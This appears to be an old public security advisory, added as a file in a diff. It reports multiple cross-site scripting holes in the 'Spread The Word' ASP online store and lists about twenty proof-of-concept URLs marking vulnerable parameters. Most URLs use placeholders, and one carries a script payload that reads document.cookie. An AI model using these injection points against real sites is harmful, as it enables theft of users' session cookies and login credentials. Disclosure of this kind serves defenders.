@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/13733/info
+
+Spread The Word is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/store/BrowseCategories.asp?Cat0=783&Cat0Literal=Gifts&Cat1=839&Cat1Literal=Bible[XSS-here]
+http://www.example.com/store/BrowseCategories.asp?Cat0=783&Cat0Literal=Gifts&Cat1=839[XSS-here]&Cat1Literal=Bible
+http://www.example.com/store/BrowseCategories.asp?Cat0=783&Cat0Literal=Gifts[XSS-here]&Cat1=839&Cat1Literal=Bible
+http://www.example.com/store/BrowseCategories.asp?Cat0=783[XSS-here]&Cat0Literal=Gifts&Cat1=839&Cat1Literal=Bible
+http://www.example.com/store/Search.asp?InStock=[XSS-here]&SearchType=783&strSearch=i&SearchCat1=-1&SearchCat2=-1&PriceMin=&PriceMax=&PublicationDate=-1
+http://www.example.com/store/Search.asp?InStock=&SearchType=783&strSearch=[XSS-here]&SearchCat1=-1&SearchCat2=-1&PriceMin=&PriceMax=&PublicationDate=-1
+http://www.example.com/store/Search.asp?InStock=&SearchType=783&strSearch=lol&SearchCat1=-1[XSS-here]&SearchCat2=-1&PriceMin=&PriceMax=&PublicationDate=-1
+http://www.example.com/store/Search.asp?InStock=&SearchType=783&strSearch=lol&SearchCat1=-1&SearchCat2=-1[XSS-here]&PriceMin=&PriceMax=&PublicationDate=-1
+http://www.example.com/store/Search.asp?InStock=&SearchType=783&strSearch=lol&SearchCat1=-1&SearchCat2=-1&PriceMin=[XSS-here]&PriceMax=&PublicationDate=-1
+http://www.example.com/store/Search.asp?InStock=&SearchType=783&strSearch=lol&SearchCat1=-1&SearchCat2=-1&PriceMin=&PriceMax=[XSS-here]&PublicationDate=-1
+http://www.example.com/store/AdvancedSearch.asp?strSearch=[XSS-CODE]&SearchType=-1&SearchCat1=-1&SearchCat2=-1&Author=dd&PublicationDate=-1&PriceMin=1&PriceMax=11111111&B1=Submit
+http://www.example.com/store/ViewItem.asp?ISBN=0789906651[XSS-here]&Cat0=565
+http://www.example.com/store/ViewItem.asp?ISBN=0789906651&Cat0=565[XSS-here]
+http://www.example.com/store/STWShowContent.asp?idRightPage=13032[XSS-CODE]
+http://www.example.com/store/MySide.Asp?Cat0=565&Cat0Literal=Bibles[XSS-CODE]
+http://www.example.com/store/BrowseMain.asp?Cat0=565[XSS-CODE]&Cat0Literal=Bibles&CurHigh=4
+http://www.example.com/store/BrowseMain.asp?Cat0=565&Cat0Literal=Bibles[XSS-CODE]&CurHigh=4
+http://www.example.com/store/BrowseMain.asp?Cat0=783&Cat0Literal=Gifts&CurHigh=3"><script>alert(document.cookie)</script>
+http://www.example.com/store/NewCustomer.asp?newemail=zzzz@lalala.es&RedirectURL=[XSS-CODE]
+http://www.example.com/store/Login.asp?RedirectURL=[XSS-code] 
